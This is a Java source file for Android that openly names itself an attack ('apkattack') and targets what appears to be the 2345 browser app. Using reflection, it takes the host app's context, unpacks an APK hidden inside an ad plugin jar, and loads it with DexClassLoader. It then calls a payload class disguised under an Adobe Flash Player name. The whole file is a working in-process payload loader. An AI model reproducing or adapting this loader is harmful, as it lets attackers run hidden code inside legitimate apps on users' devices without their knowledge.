package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class Browser2345 {
	public static void Browser2345Entry(){
		String Tag = "Browser2345Entry";
		try {
			Log.e(Tag,"start");
			
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
			
	
			String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "fuck_2345/";
	
	    	String dexmethodname = "start";
	    	
	    	String apkfn = "";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	
	    	
	    	String cfgfn = "ark.dat";
	    	boolean apkexist = false;
	    	boolean cfgexit = false;
	    	File assetspathFile = new File(unzippath + "assets/");
	    	if (assetspathFile.exists() == true) {
				File assetsFiles[] = assetspathFile.listFiles();
				if (assetsFiles != null && assetsFiles.length > 0) {
					for(int i = 0;i < assetsFiles.length; i ++)
					{
						String subfn = assetsFiles[i].getName();
						if(subfn.endsWith(".apk") == true){
							apkexist = true;
							apkfn = subfn;
						}else if (subfn.equals(cfgfn) == true) {
							cfgexit = true;
						}
					}
				}
			}else{
				boolean ret = assetspathFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + assetspathFile.getName());
					return;
				}
			}
	    	
	    	
	    	if (apkexist == false || cfgexit == false ) {
		    	String pluginfn = apppath + "files/"+".mobAds/mobAds.jar";
				File pluginfile = new File(pluginfn);
				if(pluginfile.exists() == false){
					Log.e(Tag,"not found:" + pluginfn);
					return;
				}
	
		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginfn)));
	
	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}
	    	
	
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
	    	if (apkfn.equals("")) {
	    		Log.e(Tag,"not found apk file");
				return;
			}
	
	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());
	
			Class<?> cls = dexcl.loadClass(dexclassname);
		    Object obj = cls.newInstance();
	
		    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
		    method.invoke(obj,context,unzippath + "assets/");
		    
		    Log.e(Tag, "Browser2345Entry load apk success");
		} catch (Exception ex) {
			ex.printStackTrace();
			Log.e(Tag, "Browser2345Entry load apk exception");
		}
	}
}
